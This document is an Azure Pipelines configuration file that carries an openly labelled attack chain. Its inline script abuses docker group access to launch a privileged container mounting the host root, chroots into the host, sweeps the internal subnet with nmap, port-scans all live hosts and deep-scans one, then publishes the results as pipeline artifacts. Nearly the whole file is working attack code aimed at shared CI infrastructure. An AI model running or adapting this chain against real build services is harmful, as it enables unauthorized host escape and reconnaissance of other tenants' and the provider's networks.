# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: ExploitChain
  displayName: 'Full Attack Chain: Host Escape & Service Hunting'
  jobs:
  - job: Linux_Host_Escape_And_Service_Hunt
    displayName: 'PoC: Host Escape, Subnet Sweep, and Port Scan'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Execute Full Attack Chain'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if [ -S "/var/run/docker.sock" ] && getent group docker && id | grep -q '(docker)'; then
            echo "✅ SUCCESS: Confirmed user is in 'docker' group and socket is present."
          else
            echo "❌ CRITICAL FAILURE: The container escape vector was not found. Aborting."
            id
            ls -l /var/run/docker.sock || echo "Socket not found."
            exit 1
          fi
          
          echo "--- Installing tools (Nmap) ---"
          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
          
          SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
          echo "Discovered internal subnet: $SUBNET"

          echo "--- ESCAPING CONTAINER to perform reconnaissance from the host ---"
          
          # We create a temporary directory on the host that we can write to from the chroot jail.
          # The path inside the container will be /hostfs/tmp/scan_results
          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
            -v /usr/bin/nmap:/usr/bin/nmap \
            alpine:latest sh -c "
              # Create a directory on the host we can write to
              mkdir -p /hostfs/tmp/scan_results

              echo '--- [HOST] Identifying all live hosts on the subnet ---'
              chroot /hostfs /usr/bin/nmap -sn -T4 ${SUBNET} -oG /tmp/scan_results/host-sweep.gnmap

              # Extract just the IP addresses of hosts that are up
              grep 'Status: Up' /hostfs/tmp/scan_results/host-sweep.gnmap | awk '{print \$2}' > /hostfs/tmp/scan_results/hosts-up.txt
              
              LIVE_HOST_COUNT=\$(wc -l < /hostfs/tmp/scan_results/hosts-up.txt)
              echo \"--- [HOST] Found \$LIVE_HOST_COUNT live hosts. Beginning targeted port scan. ---\"

              if [ \"\$LIVE_HOST_COUNT\" -eq 0 ]; then
                echo '[!] No live hosts found to scan.'
                exit 0
              fi

              # Scan all live hosts for a wider range of common service ports
              echo '--- [HOST] Scanning top 1000 TCP ports on all live hosts... ---'
              chroot /hostfs /usr/bin/nmap -sT --top-ports 1000 --open -T4 -iL /tmp/scan_results/hosts-up.txt -oN /tmp/scan_results/wide-port-scan-results.txt
              
              # As a parallel effort, pick the FIRST live host (that isn't the gateway) for a full port scan
              FIRST_TARGET=\$(grep -v '10.1.0.1' /hostfs/tmp/scan_results/hosts-up.txt | head -n 1)
              if [ -n \"\$FIRST_TARGET\" ]; then
                echo \"--- [HOST] Performing a full TCP port scan (1-65535) on the first discovered host: \$FIRST_TARGET ---\"
                chroot /hostfs /usr/bin/nmap -sT -p- --open -T4 \$FIRST_TARGET -oN /tmp/scan_results/deep-scan-\$FIRST_TARGET.txt
              fi
            "
          # Copy the results from the host's temp directory back to our artifacts directory
          sudo cp /tmp/scan_results/* artifacts/
          
          echo "✅ EXPLOIT CHAIN COMPLETE. Review the published artifacts."

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Attack Chain Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-attack-chain-results'
